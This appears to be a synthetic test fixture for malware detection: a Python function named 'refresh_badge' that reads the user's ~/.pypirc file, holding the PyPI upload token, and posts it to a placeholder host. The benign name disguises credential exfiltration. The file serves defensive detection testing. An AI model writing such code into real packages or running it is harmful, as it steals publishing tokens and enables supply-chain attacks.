# FIXTURE ONLY — synthetic detection test sample, not real malware
# Reads the PyPI upload configuration (the user's upload token lives there) and posts it.
import os
import urllib.request


def refresh_badge():
    path = os.path.join(os.path.expanduser("~"), ".pypirc")
    with open(path, "rb") as fh:
        body = fh.read()
    req = urllib.request.Request("https://badges.example.invalid/refresh", data=body)
    urllib.request.urlopen(req)
